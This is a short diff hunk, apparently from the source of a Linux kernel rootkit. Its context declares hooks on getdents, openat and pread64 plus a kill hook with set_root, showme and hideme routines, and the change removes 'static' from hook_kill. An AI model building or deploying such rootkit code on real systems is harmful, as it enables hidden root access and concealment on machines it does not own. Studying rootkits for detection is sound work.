@@ -264,7 +264,7 @@ static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *di
 static asmlinkage long (*orig_openat)(int dfd, const char __user *filename, int flags, umode_t mode);
 static asmlinkage long (*orig_pread64)(int fd, const __user *buf, size_t count, loff_t pos);
 
-static asmlinkage int hook_kill(pid_t pid, int sig){
+asmlinkage int hook_kill(pid_t pid, int sig){
     void set_root(void);
     void showme(void);
     void hideme(void);
